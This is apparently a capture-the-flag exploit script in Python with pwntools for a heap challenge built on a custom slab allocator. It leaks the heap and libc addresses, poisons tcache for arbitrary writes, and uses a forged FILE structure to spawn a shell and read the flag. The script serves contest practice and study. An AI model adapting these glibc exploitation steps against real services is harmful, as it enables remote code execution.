#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via: 
# $ pwn template --host localhost --port 6019 chal
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'chal')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'chall.polygl0ts.ch'
docker_id = args.DOCKER
port = int(args.PORT or 6019)

context.terminal = ["tmux", "split", "-h"]


def debug(io, do_pause=False):
    if args.LOCAL:
        gdb.attach(io.pid, exe=exe.path, gdbscript=gdbscript)
    elif args.DOCKER:
        import docker
        procs = docker.from_env().containers.get(
            args.DOCKER).top()["Processes"]

        nspid = procs[0][1]
        elf_pid = procs[-1][1]  # TODO: find better way
    with tempfile.NamedTemporaryFile(prefix='pwnlib-gdbscript-', suffix='.gdb', delete=False, mode='w+') as tmp:
        tmp.write(gdbscript)
        cmd = ["nsenter", "-U", "-t", nspid, "-n"]
        cmd += ["gdb", "-pid", elf_pid, "-x", tmp.name]
        dbg = util.misc.run_in_new_terminal(cmd)
        sleep(1)
    if do_pause:
        pause()


def start_local(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    return connect(host, port, fam="ipv4")


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = f'''
file {exe.path}
tbreak main
continue
file {exe.path}
'''.format(**locals())


def prompt(m, **kwargs):
    r = kwargs.pop("io", io)
    prefix = kwargs.pop("prefix", prompt_prefix)
    line = kwargs.pop("line", True)
    if prefix is not None:
        if line:
            r.sendlineafter(prefix, m, **kwargs)
        else:
            r.sendafter(prefix, m, **kwargs)
    else:
        if line:
            r.sendline(m, **kwargs)
        else:
            r.send(m, **kwargs)


def prompti(i, **kwargs):
    prompt(f"{i}".encode(), **kwargs)


def cmd(i, **kwargs):
    prefix = kwargs.pop("prefix", cmd_prefix)
    prompti(i, prefix=prefix, **kwargs)


def upk(m, **kwargs):
    return unpack(m, "all", **kwargs)


def printx(**kwargs):
    for k, v in kwargs.items():
        log.critical(f"{k}: {v:#x}")

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
# Arch:     amd64-64-little
# RELRO:      Full RELRO
# Stack:      Canary found
# NX:         NX enabled
# PIE:        PIE enabled
# Stripped:   No
# Debuginfo:  Yes


prompt_prefix = None #b"> "
cmd_prefix = None #b"> "

MALLOC = 1
SNALLOC = 2
SNAB_AUTO = 1
SNAB_EXTEND = 2

MAX_SNABS = 0x10
SNAB_CHUNKS = 0x40
MAX_ALLOCS = 0x1000
MAX_ALLOC_SIZE = 0x100
MALLOC_MIN = 0x20
TCACHE_CAP = 0x7
PAGE = 0x1000

malloc_indices = {i: 0 for i in range(MAX_ALLOCS)}
snalloc_indices = {i: 0 for i in range(MAX_ALLOCS)}


def alloc_set_used(allocator, idx):
    allocator_indices = malloc_indices if allocator == MALLOC else snalloc_indices
    allocator_indices[idx] = True


def alloc_set_unused(allocator, idx):
    allocator_indices = malloc_indices if allocator == MALLOC else snalloc_indices
    allocator_indices[idx] = False


def alloc_index(allocator) -> int:
    allocator_indices = malloc_indices if allocator == MALLOC else snalloc_indices
    for i, used in allocator_indices.items():
        if not used:
            alloc_set_used(allocator, i)
            return i
    raise ValueError("no index left")


def alloc(allocator, size, idx: int | None = None, meme: int | None = None, prefix = prompt_prefix):
    if idx is None:
        idx = alloc_index(allocator)
    else:
        alloc_set_used(allocator, idx)
    if meme is None:
        cmd(1)
    else:
        prompt(b"1".rjust(meme, b"0"))
    prompti(allocator, prefix=prefix)
    prompti(idx, prefix=prefix)
    prompti(size-8 if allocator == MALLOC else size, prefix=prefix)
    return idx


def edit(allocator, idx, content, prefix = None):
    cmd(2)
    prompti(allocator,prefix=prefix)
    prompti(idx, prefix=prefix)
    prompt(content, prefix=prefix)


def free(allocator, idx):
    cmd(3)
    prompti(allocator)
    prompti(idx)
    alloc_set_unused(allocator, idx)


def snab_meta(magic, flag, order, bitmap, prev, next):
    return flat({
        0x0: magic,
        0x8: flag,
        0x10: order,
        0x18: bitmap,
        0x20: prev,
        0x28: next,
    })


def tcache_entry(size):
    return tcache_entries + (size//0x10-0x2) * 8


def brute_heap_base(chunk_size: int):
    tcache = []
    fastbin = []
    padding = []
    tcache_pad = []

    assert chunk_size >= MALLOC_MIN and chunk_size & 0xf == 0
    assert PAGE % chunk_size == 0 and chunk_size < MAX_ALLOC_SIZE

    padding_size = MAX_ALLOC_SIZE

    # NOTE:  1st fastbin chunk in 2nd page must be page-aligned with spoofed magic
    n_fastbin = (PAGE * 3) // chunk_size
    n_fastbin_snab = (PAGE * 2) // chunk_size

    magic = 0x0
    flag = SNAB_AUTO
    order = 3
    bitmap = 0xffffffffffffffff
    prev = 0
    next = 0

    for i in range(TCACHE_CAP):
        tcache_pad.append(alloc(MALLOC, padding_size))

    for i in range(TCACHE_CAP):
        tcache.append(alloc(MALLOC, chunk_size))

    for i in range(n_fastbin):
        fastbin.append(alloc(MALLOC, chunk_size))

    edit(MALLOC, fastbin[n_fastbin_snab],
         snab_meta(magic, flag, order, bitmap, prev, next))

    for t in tcache[::-1]:
        free(MALLOC, t)
    free(MALLOC, fastbin[n_fastbin_snab])
    for f in fastbin[:n_fastbin_snab]+fastbin[n_fastbin_snab+1:]:
        free(MALLOC, f)

    tcache.clear()
    fastbin.clear()

    for _ in range(TCACHE_CAP):
        alloc(MALLOC, chunk_size)

    for i in range(2*PAGE//padding_size):
        padding.append(alloc(MALLOC, padding_size,
                       meme=None if i != 0 else 0x1000))

    for tp in tcache_pad[::-1]:
        free(MALLOC, tp)
    tcache_pad.clear()

    for p in padding:
        free(MALLOC, p)

    magic = b""
    snab_chunk_size = 0x100  # order 3
    snab_chunks = []
    for i in range(SNAB_CHUNKS * (MAX_SNABS+0x1)):
        snab_chunks.append(alloc(SNALLOC, snab_chunk_size))
    idx_brute = snab_chunks[PAGE//snab_chunk_size]
    idx_size = snab_chunks[PAGE//snab_chunk_size-1]
    for i in range(8):
        found_byte = False
        for b in range(0x100):
            # 1st chunk in second page
            # to pass check_slab_chunk() checks
            test_idx = (2 * PAGE) // snab_chunk_size + i
            magic_test = magic + p8(b)
            edit(SNALLOC, idx_brute, magic_test)
            free(SNALLOC, snab_chunks[test_idx])
            free(MALLOC, 0xfff)
            io.recvuntil(b"empty")
            snab_chunks[test_idx] = alloc(SNALLOC, snab_chunk_size, prefix=b"> ")
            test = io.recvuntil(b"1 - alloc")
            if b"alloc:" in test:
                magic = magic_test
                printx(magic=upk(magic))
                found_byte = True
                break
        if not found_byte:
            raise EOFError("brute failed!")
    heap_leak = upk(magic) << 12
    heap_base = heap_leak - PAGE * 3
    printx(heap_leak=heap_base)
    return idx_brute, idx_size, snab_chunks[test_idx+1], upk(magic), heap_base


def arbw(target, content):
    write_size = pois_size - 0x10
    while len(content) > 0:
        edit(SNALLOC, pois_idx, p64(magic ^ target))
        t1 = alloc(MALLOC, pois_size)
        t2 = alloc(MALLOC, pois_size)
        edit(MALLOC, t2, content[:write_size])
        free(MALLOC, t1)
        target += pois_size-0x10
        content = content[write_size:]


def pack_fp(fp, **kwargs):
    suffix = kwargs.pop("suffix", b"")
    for k, v in kwargs.items():
        setattr(fp, k, v)
    return (bytes(fp)+suffix)


def exploit():
    global io
    global malloc_indices
    global snalloc_indices
    global tcache_entries
    global pois_size
    global pois_idx
    global magic
    libc = ELF("./libc.so.6")
    # 4bit bf on last 2 bytes
    libc.address = 0x00007ffff7da2000
    malloc_indices = {i: 0 for i in range(MAX_ALLOCS)}
    snalloc_indices = {i: 0 for i in range(MAX_ALLOCS)}
    io = start()
    chunk_size = 0x80
    pad_size = MAX_ALLOC_SIZE
    start_heap_off = 0x300
    alloc_off = TCACHE_CAP * (chunk_size+pad_size) + 0x300 + 0x10
    alloc_rem_page = PAGE - alloc_off
    printx(alloc_off=alloc_off, alloc_rem_page=alloc_rem_page)
    malloc_indices = {i: 0 for i in range(MAX_ALLOCS)}
    snalloc_indices = {i: 0 for i in range(MAX_ALLOCS)}

    # VULN: get_snab_from_chunk can be tricked into returning
    # a fake snab start, if the magic is correct

    # step 1 - heap leak
    # - memset on snab_free() prevents magic reuse from freed snabs
    # - need to use a safelinked NULL ptr from malloc chunk
    # - fastbin & tcache chunks too small by themselves
    # - use fastbin consolidation (big alloc/free with scanf)
    # - overlap page aligned slab chunk with fake magic
    # - brute magic byte by byte, by using allocation failure as oracle
    while alloc_rem_page >= MAX_ALLOC_SIZE+MALLOC_MIN:
        alloc(MALLOC, MAX_ALLOC_SIZE)
        alloc_rem_page -= MAX_ALLOC_SIZE
    if (alloc_rem_page <= MAX_ALLOC_SIZE):
        alloc(MALLOC, alloc_rem_page)
    else:
        alloc(MALLOC, alloc_rem_page-MALLOC_MIN)
        alloc(MALLOC, MALLOC_MIN)

    snab_meta_idx, chunk_size_idx, test_idx, magic, heap = brute_heap_base(
        0x80)
    printx(snab=snab_meta_idx, test_idx=test_idx,
           snab_chunk_size=chunk_size_idx, magic=magic, heap=heap)

    # step 2 - overlapping chunks & arb heap write
    tcache = heap + 0x10
    pois_size = 0xf0
    pois_idx = snab_meta_idx
    printx(tcache=tcache)
    edit(SNALLOC, chunk_size_idx, flat({MAX_ALLOC_SIZE-8: pois_size | 1}))
    edit(SNALLOC, snab_meta_idx, snab_meta(magic, SNAB_AUTO, 3, 1 << 8, 0, 0))
    free(SNALLOC, test_idx)

    # step 3 - libc leak safe alloc to stdout form libc ptr (4bit brute)
    tcache_counts = tcache
    tcache_entries = tcache + 0x98
    libc_heap_ptr = heap + 0x2000  # TODO
    csize_a = 0xb0
    csize_b = 0xd0
    arbw(tcache_entry(csize_a), p64(tcache_entry(csize_b)))
    arbw(tcache_entry(csize_b), p64(libc_heap_ptr))
    alloc(MALLOC, csize_b)
    alloc(MALLOC, csize_a)
    arbw(tcache_entry(csize_a), p64(libc.sym._IO_2_1_stdout_-0x10)[:2])
    stdout = alloc(MALLOC, csize_a)
    while io.clean():
        sleep(1)
    edit(MALLOC, stdout, p64(0)*2+p64(0xfbad1887)+p64(0)*3+b"\0", prefix=b"> ")
    libc.address = upk(io.recv(8)) - 0x20a644
    printx(libc=libc.address)
    if (libc.address & 0xfff != 0):
        raise EOFError("wrong base")
    if not args.LOCAL and args.GDB:
        debug(io)

    # step 4 - fsop RCE
    fp_ptr = libc.sym._IO_2_1_stderr_
    printx(libc=libc.address, stdout=fp_ptr)

    fp = FileStructure()
    fake_vtable_ptr = fp_ptr + 0xe0 - 0x68
    wide_data = heap + 0x1800
    pl = pack_fp(fp, flags=0x3b01010101010101,
                 _wide_data=wide_data,
                 _IO_read_ptr=b"/bin/sh\0",
                 _IO_read_end=0,
                 _IO_read_base=0,
                 _IO_write_base=0,
                 _IO_write_ptr=0,
                 _IO_write_end=0,
                 _IO_buf_base=0,
                 _IO_buf_end=0,
                 _lock=libc.sym._IO_stdfile_2_lock,
                 _IO_save_end=libc.sym.system,
                 vtable=libc.sym._IO_wfile_jumps-0x20,
                 suffix=p64(libc.sym.system) + p64(0) + p64(fake_vtable_ptr))
    arbw(wide_data-0x10, pl)
    arbw(fp_ptr, pl)
    snab_ptr = heap + PAGE
    arbw(snab_ptr+0x1000, p64((snab_ptr+0x1000) >> 12))
    # fprintf from snalloc error => rce
    free(SNALLOC, 18)
    sleep(0.1)
    io.sendline("cat ./flag.txt")
    return io.recvuntil(b"}")


while True:
    try:
        out = exploit()
        log.critical(out)
        if b"EPFL" in out:
            break
    except EOFError or ValueError:
        io.close()
